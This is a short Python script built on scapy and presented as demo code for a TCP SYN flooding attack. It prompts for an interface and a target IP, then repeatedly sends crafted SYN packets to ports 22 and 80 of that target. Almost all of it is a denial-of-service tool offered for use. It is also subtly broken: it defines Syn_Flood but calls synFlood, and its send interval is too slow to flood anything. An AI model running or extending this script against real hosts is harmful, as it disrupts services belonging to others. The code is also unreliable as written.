
# tcp-SYN PACKET flooding attack using scapy framework in minimal lines of codes.../ demo code
# further improvable 

import sys
from scapy.all import *

iface = raw_input("Network interface here..")
destination_ip = raw_input("destinaion ip address")

def Syn_Flood(destination, iface):
    print ("Starting SYN PACKET Floodding attack...")
    # manipulating the tcp packet parameters before sending to the network processing 
    
    paket=IP(dst=destination,id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
    ans,unans=srloop(paket, iface=iface, inter=0.3,retry=2,timeout=4)
    ans.summary()
    unans.summary()

# exception handling block 
try:
    synFlood(destination_ip, iface)
    
except KeyboardInterrupt:
    print("Shutting down...")
    sys.exit(0)
